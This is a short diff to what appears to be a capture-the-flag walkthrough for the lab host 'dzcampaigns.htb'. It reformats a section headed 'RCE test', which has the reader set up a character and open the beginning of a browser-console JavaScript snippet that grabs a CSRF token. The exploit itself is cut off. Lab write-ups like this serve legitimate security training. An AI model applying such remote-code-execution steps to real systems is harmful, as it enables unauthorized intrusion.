@@ -72,9 +72,9 @@ echo "TARGET_IP dzcampaigns.htb" | sudo tee -a /etc/hosts
 
 Then at `http://dzcampaigns.htb/register`, create a character; note the character ID from the edit URL (`/character/<ID>/edit`). Below assumes ID 15.
 
-### RCE test. At `http://dzcampaigns.htb/character/15/edit` → DevTools → Console:
+### RCE test
 
-javascript
+At `http://dzcampaigns.htb/character/15/edit` → DevTools → Console:
 
 ```javascript
 const csrf = document.querySelector('[name="_csrf"]').value;
